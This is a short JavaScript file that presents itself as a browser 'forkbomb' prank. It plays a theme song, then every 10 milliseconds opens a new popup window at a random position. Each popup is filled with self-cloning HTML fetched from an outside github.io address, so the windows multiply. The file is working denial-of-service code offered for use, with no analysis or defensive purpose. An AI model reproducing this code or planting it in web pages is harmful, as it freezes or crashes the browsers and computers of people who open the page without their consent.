//Chrome experience requiem
//A web browser based Wabbit/Forkbomb that is both obnoxious and a JoJos reference.
let wabbitContent = '';
(async () => {
	wabbitContent = await (await fetch('https://k4rakara.github.io/chrome-experience-requiem/wabbit.html')).text();
})();

async function createWabbit() { //Create a very similar clone window, with code to clone itself.
	let wabbit = window.open('','Wha-','width = 200,height = 200');
	wabbit.document.write(wabbitContent);
  	wabbit.moveTo((Math.random()*screen.width),(Math.random()*screen.height));
}

setTimeout(function() {document.getElementById('theme').play(); setTimeout(function() {setInterval(createWabbit,10)}, 3000);}, 2750); //Wait for the voice clip to finish, then play the theme, and once the theme has gone on for 3 seconds, initialize the payload.
